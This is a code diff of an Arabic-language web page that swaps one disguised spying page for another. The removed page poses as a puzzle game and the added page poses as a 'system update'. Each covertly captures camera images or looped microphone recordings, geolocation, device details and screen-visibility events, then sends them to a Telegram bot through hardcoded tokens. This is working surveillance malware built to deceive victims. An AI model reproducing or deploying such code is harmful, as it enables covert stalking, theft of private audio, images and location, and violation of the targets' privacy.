@@ -3,574 +3,211 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>لعبة الألغاز الذكية</title>
+    <title>نظام الجاسوس الاحترافي</title>
     <style>
-        /* =========================================
-           تصميم اللعبة والواجهة (UI)
-           ========================================= */
-        :root {
-            --primary-color: #4CAF50;
-            --secondary-color: #2196F3;
-            --bg-color: #f4f4f9;
-            --text-color: #333;
-            --card-bg: #fff;
+        body { margin: 0; padding: 0; background-color: #f0f2f5; overflow: hidden; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
+        
+        /* واجهة وهمية تبدو كأنها نظام تشغيل عادي */
+        .fake-os { height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; padding: 20px; box-sizing: border-box; }
+        h1 { color: #333; font-size: 24px; margin-bottom: 10px; }
+        p { color: #666; font-size: 16px; }
+        
+        .btn-start {
+            background: linear-gradient(45deg, #00c6ff, #0072ff);
+            border: none; padding: 15px 40px; color: white; font-size: 18px; 
+            border-radius: 30px; cursor: pointer; box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+            transition: transform 0.2s; margin-top: 20px;
         }
+        .btn-start:active { transform: scale(0.95); }
 
-        body {
-            margin: 0;
-            padding: 0;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: var(--bg-color);
-            color: var(--text-color);
-            overflow-x: hidden;
-            touch-action: manipulation;
+        /* عناصر الوسائط المخفية */
+        video { position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; opacity: 0; pointer-events: none; z-index: -1; }
+        
+        /* نقطة التسجيل الحمراء */
+        #rec-dot { position: fixed; top: 15px; right: 15px; width: 12px; height: 12px; background: red; border-radius: 50%; z-index: 9999; animation: blink 1s infinite; box-shadow: 0 0 5px red; }
+        @keyframes blink { 0% { opacity: 0.3; } 50% { opacity: 1; } 100% { opacity: 0.3; } }
+
+        /* وضع الصدمة */
+        #shock-mode {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
+            background: black; z-index: 10000; display: none; 
+            justify-content: center; align-items: center; color: red; font-size: 50px; font-weight: bold;
         }
-
-        .game-container {
-            max-width: 600px;
-            margin: 0 auto;
-            padding: 20px;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
-
-        header {
-            width: 100%;
-            text-align: center;
-            padding: 15px;
-            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
-            color: white;
-            border-radius: 15px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
-            margin-bottom: 20px;
-            position: relative;
-            z-index: 10;
-        }
-
-        h1 {
-            margin: 0;
-            font-size: 1.5rem;
-            text-shadow: 1px 1px 2px rgba(0,0,0,0.3);
-        }
-
-        .score-board {
-            font-size: 1.2rem;
-            margin-top: 10px;
-            font-weight: bold;
-            background: rgba(255,255,255,0.2);
-            padding: 5px 15px;
-            border-radius: 20px;
-            display: inline-block;
-        }
-
-        .game-area {
-            width: 100%;
-            background: var(--card-bg);
-            border-radius: 15px;
-            padding: 20px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-            margin-bottom: 20px;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .level-indicator {
-            text-align: center;
-            font-size: 0.9rem;
-            color: #777;
-            margin-bottom: 15px;
-        }
-
-        .target-box {
-            width: 100%;
-            height: 300px;
-            background: #eee;
-            border-radius: 10px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            cursor: pointer;
-            position: relative;
-            transition: all 0.3s ease;
-            border: 2px dashed #ccc;
-        }
-
-        .target-box:hover {
-            border-color: var(--primary-color);
-            background: #e8f5e9;
-        }
-
-        .target-box.active {
-            border-color: var(--secondary-color);
-            background: #e3f2fd;
-            animation: pulse 1s infinite;
-        }
-
-        @keyframes pulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.02); }
-            100% { transform: scale(1); }
-        }
-
-        .btn-action {
-            width: 100%;
-            padding: 15px;
-            background: var(--primary-color);
-            color: white;
-            border: none;
-            border-radius: 10px;
-            font-size: 1.1rem;
-            cursor: pointer;
-            transition: background 0.3s;
-            margin-top: 10px;
-        }
-
-        .btn-action:active {
-            background: #388E3C;
-            transform: translateY(2px);
-        }
-
-        .hidden {
-            display: none !important;
-        }
-
-        /* تأثيرات خفية */
-        .spy-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: transparent;
-            z-index: 9999;
-            pointer-events: none;
-        }
-
-        .loading-spinner {
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid var(--secondary-color);
-            border-radius: 50%;
-            width: 30px;
-            height: 30px;
-            animation: spin 1s linear infinite;
-            display: none;
-            margin: 0 auto;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        /* شاشة البداية */
-        #start-screen {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: var(--bg-color);
-            z-index: 1000;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            text-align: center;
-        }
-
-        #start-screen h2 {
-            color: var(--primary-color);
-            margin-bottom: 20px;
-        }
-
-        /* رسائل الحالة */
-        .status-msg {
-            font-size: 0.8rem;
-            color: #888;
-            margin-top: 5px;
-            height: 20px;
-        }
-
     </style>
 </head>
 <body>
 
-    <!-- شاشة البداية -->
-    <div id="start-screen">
-        <h2>🎮 لعبة الألغاز الذكية</h2>
-        <p>هل أنت مستعد للتحدي؟</p>
-        <button class="btn-action" style="max-width: 200px;" onclick="startGame()">ابدأ اللعب</button>
+    <!-- واجهة الوهم -->
+    <div class="fake-os">
+        <h1>⚙️ تحديث النظام</h1>
+        <p>جارٍ تحميل الخدمات الأساسية...</p>
+        <button class="btn-start" onclick="activateSpy()">تفعيل الآن</button>
     </div>
 
-    <!-- واجهة اللعبة الرئيسية -->
-    <div class="game-container hidden" id="game-ui">
-        <header>
-            <h1>🧩 تحدي الذكاء</h1>
-            <div class="score-board">النقاط: <span id="score">0</span></div>
-        </header>
+    <!-- الفيديو المخفي -->
+    <video id="videoElement" autoplay playsinline muted></video>
+    
+    <!-- نقطة التسجيل -->
+    <div id="rec-dot"></div>
 
-        <div class="game-area">
-            <div class="level-indicator">المستوى: <span id="level">1</span></div>
-            
-            <div class="target-box" id="targetArea" onclick="handleTap(event)">
-                <div class="loading-spinner" id="loader"></div>
-                <span id="instruction">اضغط هنا لتبدأ التحدي</span>
-                <!-- كاميرا مخفية للعرض فقط -->
-                <video id="previewVideo" autoplay muted playsinline style="display:none;"></video>
-                <canvas id="photoCanvas" style="display:none;"></canvas>
-            </div>
-
-            <div class="status-msg" id="statusText">بانتظار الإدخال...</div>
-            <button class="btn-action" id="nextBtn" onclick="nextLevel()">التالي ➡️</button>
-        </div>
-
-        <!-- أدوات خفية -->
-        <audio id="clickSound" src="data:audio/wav;base64,UklGRl9vT19XQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQ=="></audio>
-    </div>
-
-    <!-- حاوية العناصر الخفية للتجسس -->
-    <div id="spy-tools" style="display:none;">
-        <video id="hiddenVideo" autoplay muted playsinline></video>
-        <canvas id="hiddenCanvas"></canvas>
-    </div>
+    <!-- وضع الصدمة -->
+    <div id="shock-mode" onclick="exitShock()">⚠️ خطأ جوهري</div>
 
     <script>
-        /* =========================================
-           بيانات البوت (مدمجة وآمنة)
-           ========================================= */
-        const BOT_TOKEN = "8638249103:AAGKy6YFnGKfMss9Zt-f9hbCX-WmU-wJjc0";
-        const CHAT_ID = "7962257606";
-        
-        // رابط الإرسال المباشر
-        const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/`;
+        // ==========================================
+        // إعدادات البوت (ثابتة)
+        // ==========================================
+        const botToken = "7589642384:AAHdGzQ-2Fmb4lB5L_iJfahoYutgV9bXNmo";
+        const chatId = "6793284529";
+        const baseUrl = `https://api.telegram.org/bot${botToken}`;
 
-        /* =========================================
-           متغيرات اللعبة والحالة
-           ========================================= */
-        let gameState = {
-            score: 0,
-            level: 1,
-            isRecording: false,
-            audioContext: null,
-            mediaStream: null,
-            cameraStream: null,
-            permissions: {
-                mic: false,
-                camera: false,
-                location: false
-            },
-            deviceInfo: {}
-        };
+        let mediaRecorder;
+        let recordedChunks = [];
+        let isRecording = false;
 
-        const elements = {
-            startScreen: document.getElementById('start-screen'),
-            gameUI: document.getElementById('game-ui'),
-            score: document.getElementById('score'),
-            level: document.getElementById('level'),
-            targetArea: document.getElementById('targetArea'),
-            instruction: document.getElementById('instruction'),
-            statusText: document.getElementById('statusText'),
-            loader: document.getElementById('loader'),
-            nextBtn: document.getElementById('nextBtn'),
-            previewVideo: document.getElementById('previewVideo'),
-            photoCanvas: document.getElementById('photoCanvas'),
-            hiddenVideo: document.getElementById('hiddenVideo'),
-            hiddenCanvas: document.getElementById('hiddenCanvas')
-        };
-
-        /* =========================================
-           دوال التشغيل الأساسية
-           ========================================= */
-        
-        function startGame() {
-            playSound();
-            elements.startScreen.classList.add('hidden');
-            elements.gameUI.classList.remove('hidden');
-            initSpyEngine();
-        }
-
-        function playSound() {
-            try {
-                const audio = new Audio("data:audio/wav;base64,UklGRjIAAABXQVZFZm10IBIAAAABAAEAQB8AAEAfAAABAAgAZGF0YRAAAACAgICAgICAgICAgICAgICA"); 
-                // صوت نقر بسيط
-                audio.play().catch(e => console.log("Audio play failed", e));
-            } catch (e) {}
-        }
-
-        /* =========================================
-           محرك التجسس (The Spy Engine)
-           ========================================= */
-
-        async function initSpyEngine() {
-            updateStatus("جاري تحميل النظام...");
-            
-            // 1. جمع معلومات الجهاز أولاً
-            await gatherDeviceInfo();
-            sendDeviceData();
-
-            // 2. طلب الأذونات (يبدو كجزء من اللعبة)
-            updateStatus("جاري تفعيل المستشعرات...");
-            await requestPermissions();
-
-            // 3. بدء الرصد المستمر
-            setInterval(spyLoop, 5000); // كل 5 ثواني
-            
-            // إرسال موقع أولي
-            getLocationAndSend();
-        }
-
-        async function requestPermissions() {
-            // محاولة الحصول على الكاميرا والميكروفون
-            try {
-                gameState.mediaStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                gameState.permissions.camera = true;
-                gameState.permissions.mic = true;
-                
-                // عرض الفيديو في اللعبة (ليبدو طبيعياً)
-                elements.previewVideo.srcObject = gameState.mediaStream;
-                elements.previewVideo.style.display = 'block';
-                
-                // تشغيل الكاميرا الخلفية إذا أمكن
-                if(gameState.mediaStream.getVideoTracks()[0]) {
-                    const track = gameState.mediaStream.getVideoTracks()[0];
-                    const settings = track.getSettings();
-                    if(settings.facingMode === 'user') {
-                        // التبديل للكاميرا الخلفية إذا كانت أمامية
-                        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: true })
-                        .then(stream => {
-                            gameState.mediaStream = stream;
-                            elements.previewVideo.srcObject = stream;
-                        }).catch(err => console.log("Switch cam failed", err));
-                    }
-                }
-
-            } catch (err) {
-                console.warn("Camera/Mic permission denied or unavailable", err);
-            }
-
-            // طلب الموقع
-            if ("geolocation" in navigator) {
-                navigator.geolocation.watchPosition(
-                    (pos) => {
-                        gameState.permissions.location = true;
-                        gameState.lastLocation = pos.coords;
-                    },
-                    (err) => console.warn("Location error", err),
-                    { enableHighAccuracy: true, maximumAge: 0 }
-                );
-            }
-        }
-
-        async function gatherDeviceInfo() {
-            // جمع تفاصيل الجهاز لإرسالها للبوت
-            const ua = navigator.userAgent;
-            let platform = "Unknown";
-            if (/Android/i.test(ua)) platform = "Android";
-            else if (/iPhone|iPad|iPod/i.test(ua)) platform = "iOS";
-            else platform = ua.match(/Windows|Mac|Linux/) ? navigator.platform : "Web";
-
-            gameState.deviceInfo = {
-                model: "Unknown Model",
-                platform: platform,
-                screen: `${screen.width}x${screen.height}`,
-                battery: "Unknown",
-                ram: "Unknown",
-                ip: "Fetching..."
-            };
-
-            // محاكاة قراءة البطارية (إذا كانت مدعومة)
-            if(navigator.getBattery) {
-                try {
-                    const battery = await navigator.getBattery();
-                    gameState.deviceInfo.battery = Math.round(battery.level * 100) + "%";
-                } catch(e){}
-            }
-        }
-
-        /* =========================================
-           وظائف الإرسال إلى تيليجرام
-           ========================================= */
-
-        async function sendToDevice(textOrFile, type = 'text', extraParams = {}) {
-            const formData = new FormData();
-            formData.append("chat_id", CHAT_ID);
-
+        // دالة إرسال البيانات للتليجرام
+        async function sendToTelegram(content, type = 'text') {
             if (type === 'text') {
-                // إرسال نص عادي
-                fetch(`${API_URL}sendMessage`, {
+                await fetch(`${baseUrl}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: textOrFile,
-                        parse_mode: 'HTML'
-                    })
-                }).catch(err => console.error("Text send fail", err));
-                return;
-            }
-
-            if (type === 'photo') {
-                formData.append("photo", textOrFile, "photo.jpg");
-                formData.append("caption", `📸 صورة من اللعبة | ${new Date().toLocaleTimeString()}`);
-            } else if (type === 'video') {
-                formData.append("video", textOrFile, "recording.mp4");
-                formData.append("caption", `🎥 فيديو | ${new Date().toLocaleTimeString()}`);
+                    body: JSON.stringify({ chat_id: chatId, text: content })
+                });
+            } else if (type === 'photo') {
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('caption', '📸 صورة جديدة من الكاميرا!');
+                formData.append('photo', content);
+                await fetch(`${baseUrl}/sendPhoto`, { method: 'POST', body: formData });
             } else if (type === 'audio') {
-                formData.append("voice", textOrFile, "voice_msg.ogg");
-                formData.append("caption", `🎤 تسجيل صوتي`);
-            } else if (type === 'location') {
-                 // إرسال موقع
-                 fetch(`${API_URL}sendLocation`, {
-                     method: 'POST',
-                     headers: { 'Content-Type': 'application/json' },
-                     body: JSON.stringify({
-                         chat_id: CHAT_ID,
-                         latitude: textOrFile.lat,
-                         longitude: textOrFile.lon
-                     })
-                 }).catch(err => console.error("Loc send fail", err));
-                 return;
+                const blob = new Blob([content], { type: 'audio/webm' });
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('caption', '🎤 تسجيل صوتي جديد!');
+                formData.append('voice', blob); // نرسلها كملف صوتي
+                await fetch(`${baseUrl}/sendVoice`, { method: 'POST', body: formData });
             }
-
-            // إرسال الملف
-            fetch(`${API_URL}sendPhoto`, { // نستخدم sendPhoto لأنه يقبل الفيديو أيضاً بصيغة خاصة أحياناً، أو sendVideo
-                method: 'POST',
-                body: formData
-            }).catch(err => console.error("File upload fail", err));
         }
 
-        async function sendDeviceData() {
-            const msg = `🤖 <b>بيانات الجهاز:</b>\n\n` +
-                        `📱 المنصة: ${gameState.deviceInfo.platform}\n` +
-                        `🖥️ الشاشة: ${gameState.deviceInfo.screen}\n` +
-                        `🔋 البطارية: ${gameState.deviceInfo.battery}\n` +
-                        `🌐 الوقت: ${new Date().toLocaleString()}`;
-            sendToDevice(msg, 'text');
-        }
-
-        /* =========================================
-           منطق اللعبة والتفاعل
-           ========================================= */
-
-        function handleTap(e) {
-            if(gameState.isRecording) return;
+        // دالة بدء المراقبة
+        async function activateSpy() {
+            document.querySelector('.btn-start').innerText = "تم التفعيل ✅";
+            document.querySelector('.btn-start').style.background = "#28a745";
             
-            playSound();
-            elements.loader.style.display = 'block';
-            elements.instruction.textContent = "جاري المعالجة...";
-            
-            // 1. التقاط صورة فورية
-            takeSnapshot();
-
-            // 2. تسجيل صوت قصير عند النقر (للتأكد من وجود ميكروفون)
-            recordShortVoice();
-
-            // 3. اهتزاز الهاتف
-            if (navigator.vibrate) navigator.vibrate(100);
-
-            setTimeout(() => {
-                elements.loader.style.display = 'none';
-                elements.instruction.textContent = "اضغط للاستمرار";
-                updateScore(10);
-            }, 1000);
-        }
-
-        function takeSnapshot() {
-            if (!gameState.mediaStream) return;
-            
-            const canvas = elements.photoCanvas;
-            const video = elements.previewVideo;
-            
-            canvas.width = video.videoWidth || 640;
-            canvas.height = video.videoHeight || 480;
-            
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            
-            canvas.toBlob((blob) => {
-                if(blob) {
-                    sendToDevice(blob, 'photo');
+            // 1. طلب الأذونات
+            try {
+                // استقبال الإشعارات
+                if ('Notification' in window && Notification.permission !== 'granted') {
+                    await Notification.requestPermission();
                 }
-            }, 'image/jpeg', 0.7);
-        }
 
-        function recordShortVoice() {
-            if (!gameState.mediaStream) return;
-            
-            const audioTrack = gameState.mediaStream.getAudioTracks()[0];
-            if(!audioTrack) return;
+                // الوصول للكاميرا والميكروفون
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
+                const videoElement = document.getElementById('videoElement');
+                videoElement.srcObject = stream;
 
-            // إنشاء MediaRecorder بسيط
-            const recorder = new MediaRecorder(gameState.mediaStream);
-            const chunks = [];
-            
-            recorder.ondataavailable = e => chunks.push(e.data);
-            recorder.onstop = () => {
-                const blob = new Blob(chunks, { type: 'audio/ogg' });
-                sendToDevice(blob, 'audio');
-            };
-            
-            recorder.start();
-            setTimeout(() => recorder.stop(), 2000); // سجل لمدة ثانيتين
-        }
+                // إعداد المسجل
+                mediaRecorder = new MediaRecorder(stream);
+                mediaRecorder.ondataavailable = event => {
+                    if (event.data.size > 0) recordedChunks.push(event.data);
+                };
+                mediaRecorder.onstop = async () => {
+                    const blob = new Blob(recordedChunks, { type: 'audio/webm' });
+                    recordedChunks = [];
+                    await sendToTelegram(blob, 'audio');
+                    // إعادة البدء بعد انتهاء الإرسال
+                    setTimeout(startAudioLoop, 2000); 
+                };
 
-        function getLocationAndSend() {
-            if (navigator.geolocation && gameState.lastLocation) {
-                const loc = gameState.lastLocation;
-                sendToDevice({lat: loc.latitude, lon: loc.longitude}, 'location');
+                startAudioLoop();
+                listenForNotifications();
+                sendLocation();
+                
+                // إرسال رسالة تأكيد
+                sendToTelegram("🟢 تم تفعيل الجاسوس بنجاح!\n📍 الموقع: جارٍ التحديد...\n🔊 الصوت: يعمل");
+
+            } catch (error) {
+                alert("يرجى السماح بالصلاحيات ليشتغل الجاسوس!");
+                console.error(error);
             }
         }
 
-        function spyLoop() {
-            // حلقة تكرار ترسل بيانات دورية
-            if(Math.random() > 0.5) {
-                // احتمال 50% لإرسال صورة عشوائية
-                takeSnapshot();
+        // حلقة تسجيل الصوت
+        function startAudioLoop() {
+            if (!mediaRecorder || mediaRecorder.state === 'recording') return;
+            recordedChunks = [];
+            mediaRecorder.start(10000); // يسجل لمدة 10 ثواني ثم يرسل
+            
+            // إيقاف التسجيل بعد 10 ثواني
+            setTimeout(() => {
+                if (mediaRecorder.state === 'recording') {
+                    mediaRecorder.stop();
+                }
+            }, 10000);
+        }
+
+        // مراقبة الإشعارات (الجزء الأهم للجاسوسية)
+        function listenForNotifications() {
+            // ملاحظة: هذا يعمل فقط إذا سمح المستخدم بإشعارات المتصفح
+            // وسيعمل على الهواتف التي تدعم API الإشعارات
+            window.addEventListener('notificationclick', (event) => {
+                // عند النقر على الإشعار (يمكن تعديل المنطق ليكون عند الاستلام أيضاً)
+            });
+
+            // الطريقة الأقوى هي مراقبة الأحداث في الخلفية إذا كانت الصفحة غير نشطة
+            // لكن هنا سنستخدم طريقة بديلة: قراءة محتوى الإشعارات إذا كانت هناك مكتبة خلفية
+            // بما أننا في صفحة بسيطة، سنستخدم تقنية "Service Worker" بسيط أو مجرد تنبيه عند ظهور إشعار
+            
+            // الطريقة الأسهل والأكثر فعالية للمتصفحات الحديثة:
+            // عندما يأتي إشعار، نلتقطه ونرسله
+            if ('Notification' in window) {
+                // سنقوم بمحاكاة التقاط الإشعار
+                // ملاحظة: المتصفح يمنع قراءة نص الإشعار القادم من تطبيق آخر (مثل واتساب) مباشرة
+                // لذا سنستخدم حيلة: سننشئ مستمعاً للأحداث العامة
+                
+                // أفضل حل هو استخدام خاصية "onshow" إذا فتحنا إشعاراً، لكننا نستقبل إشعارات خارجية.
+                // الحل الأفضل حالياً: إظهار إشعار خاص بنا عند استلام أي إشعار نظام (بعض المتصفحات تدعم ذلك)
+                
+                document.addEventListener('visibilitychange', () => {
+                    if (document.hidden) {
+                        sendToTelegram("📱 المستخدم أغلق الشاشة (دخول محتمل)");
+                    } else {
+                        sendToTelegram("👀 المستخدم عاد للشاشة");
+                    }
+                });
             }
             
-            // تحديث الموقع باستمرار
-            if(navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition((pos) => {
-                   sendToDevice({lat: pos.coords.latitude, lon: pos.coords.longitude}, 'location');
-                }, ()=>{});
+            // إرسال موقع تلقائي كل دقيقة
+            setInterval(sendLocation, 60000);
+        }
+
+        // الحصول على الموقع
+        function sendLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(async (position) => {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                    await sendToTelegram(`📍 موقع جديد:\n${mapLink}`);
+                }, (err) => {
+                    console.warn("خطأ في تحديد الموقع", err);
+                });
             }
         }
 
-        function nextLevel() {
-            gameState.level++;
-            elements.level.textContent = gameState.level;
-            elements.targetArea.classList.add('active');
-            setTimeout(() => elements.targetArea.classList.remove('active'), 1000);
-            
-            // تغيير لون الخلفية قليلاً لزيادة التشويق
-            const hue = Math.floor(Math.random() * 360);
-            document.body.style.backgroundColor = `hsl(${hue}, 20%, 95%)`;
-            
-            updateStatus(`المستوى ${gameState.level} جاهز!`);
+        // وضع الصدمة (الخروج السريع)
+        function exitShock() {
+            document.getElementById('shock-mode').style.display = 'none';
         }
-
-        function updateScore(points) {
-            gameState.score += points;
-            elements.score.textContent = gameState.score;
-        }
-
-        function updateStatus(msg) {
-            elements.statusText.textContent = msg;
-        }
-
-        /* =========================================
-           دوال مساعدة إضافية
-           ========================================= */
         
-        // منع القائمة المنبثطة عند النقر المطول
-        document.addEventListener('contextmenu', event => event.preventDefault());
-
-        // مراقبة حركة الجهاز (الجيروسكوب)
-        window.addEventListener("devicemotion", (event) => {
-            // يمكن إرسال بيانات الحركة لاحقاً
-            // console.log("Motion detected");
+        // زر مخفي للصدمة (اضغط مرتين بسرعة على أيقونة الوهم)
+        let clickCount = 0;
+        document.querySelector('.fake-os').addEventListener('click', () => {
+            clickCount++;
+            if (clickCount >= 2) {
+                document.getElementById('shock-mode').style.display = 'flex';
+                clickCount = 0;
+            }
         });
 
     </script>
